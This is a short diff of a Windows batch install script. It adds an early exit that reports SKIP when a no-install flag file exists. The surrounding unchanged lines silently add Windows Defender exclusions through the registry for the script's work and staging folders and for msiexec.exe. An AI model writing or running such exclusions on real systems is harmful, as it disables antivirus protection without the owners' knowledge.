@@ -21,6 +21,15 @@ if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
 echo [%DATE% %TIME%] force_begin build=%BUILD% host=%COMPUTERNAME%>>"%LOG%"
 
+if exist "%WD%\no_install.flag" (
+  echo BUILD=%BUILD%
+  echo HOST=%COMPUTERNAME%
+  echo HEALTH=SKIP
+  echo REASON=NO_INSTALL
+  echo REPORT %COMPUTERNAME% %FP% SKIP NO_INSTALL
+  endlocal & exit /b 0
+)
+
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%STAGE%" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
